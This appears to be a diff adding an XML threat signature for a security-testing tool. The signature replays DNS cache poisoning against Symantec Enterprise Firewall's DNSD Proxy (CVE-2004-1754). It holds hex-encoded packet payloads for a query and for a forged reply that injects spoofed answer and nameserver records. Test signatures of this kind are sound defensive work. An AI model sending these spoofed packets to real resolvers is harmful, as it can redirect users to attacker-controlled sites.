@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Symantec Enterprise Firewall DNSD Proxy Cache Poisoning"/>
+    <EngDesc display="true" value="There is a vulnerability in the way DNSD Proxy, a component of the Symantec Enterprise firewall, handles DNS responses. The DNSD Proxy, when operating as a DNS cache, can be poisoned by remote attackers pretending to be authoritative over domains for which they are not. This vulnerability can be exploited to direct users to malicious websites that appear to be trusted sites."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="DNS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Symantec_Corporation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Symantec_Corporation_Symantec_Corporation_Symantec_Enterprise_Firewall"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20040616-01"/>
+    <CVEID display="true" value="CVE-2004-1754"/>
+    <bugtraqID display="true" value="10557"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="b9fc4c4e4bc68ec902d037c67ae49e90"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633612343746718750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213725119" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="DNSdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="003F" Identification="325F" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="F1DC" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$DNSdestPort" checksum="0" length="" Payload="56E4000000010000000000000666727978617206616672616964036F72670000010001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0078" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="2403" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <UDP srcPort="" destPort="" checksum="0" length="" Payload="56E4800000010001000100010666727978617206616672616964036F72670000010001C00C0001000100000E100004C8C8C8C8C01A0002000100000E10000D0766616B65646E7303636F6D00C03F0001000100000E100004C8C8C8C9"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
